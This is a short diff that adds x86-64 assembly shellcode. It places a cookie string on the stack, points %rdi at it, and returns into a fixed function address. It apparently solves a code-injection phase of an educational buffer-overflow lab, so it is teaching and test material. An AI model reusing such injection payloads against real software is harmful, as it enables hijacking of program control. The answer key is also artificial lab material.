@@ -1,0 +1,5 @@
+movl $0x39623935,0x5561dca4
+movl $0x61663739,0x5561dca8
+movq $0x5561dca4, %rdi
+pushq $0x4018fa
+ret
